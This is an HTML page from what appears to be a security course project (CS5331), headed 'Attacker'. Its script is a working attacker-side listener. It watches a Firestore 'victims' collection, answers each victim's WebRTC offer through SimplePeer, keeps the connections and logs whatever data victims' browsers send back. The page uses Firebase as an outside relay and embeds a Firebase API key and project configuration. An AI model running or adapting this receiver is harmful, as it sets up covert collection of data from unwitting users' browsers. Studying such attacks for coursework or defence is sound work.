<html>
    <head>
        <title>CS5331</title>
    </head>
    <body>
        <h1>Attacker</h1>
    </body>
    <script src="https://www.gstatic.com/firebasejs/5.5.8/firebase.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/simple-peer/9.1.2/simplepeer.min.js"></script>
    <script type="text/javascript">
        firebase.initializeApp({
            apiKey: "AIzaSyAWLmmdXjs8q9Nx8itxtGXctIox4r6StJ4",
            authDomain: "cs5331-4dd43.firebaseapp.com",
            databaseURL: "https://cs5331-4dd43.firebaseio.com",
            projectId: "cs5331-4dd43",
            storageBucket: "cs5331-4dd43.appspot.com",
            messagingSenderId: "900684369766"
        })

        const db = firebase.firestore()
        db.settings({ timestampsInSnapshots: true})

        var conns = []

        console.log("attacker ready.")
        db.collection('victims').onSnapshot( victims => {
            victims.docChanges().forEach( change => {
                if( change.type === 'added') {
                    console.log(`attacker receiving offer from ${change.doc.id}`)

                    const conn = new SimplePeer({
                        initator: false,
                        trickle: false,
                        objectMode: true
                    })

                    conn.on('signal', data => {                        
                        console.log(`attacker sending out answer to ${change.doc.id}`)
                        db.collection('victims').doc(change.doc.id).set({
                            answer: data
                        }, {
                            merge: true
                        })
                    })

                    conn.on('connect', () => {
                        console.log(`attacker connected to ${change.doc.id}.`)
                        conns.push(conn)
                    })

                    conn.on('data', data => {
                        console.log(`[${change.doc.id}]: ${data}`)
                    })

                    conn.signal(change.doc.data().offer)
                }
            })
        })

        
    </script>
</html>
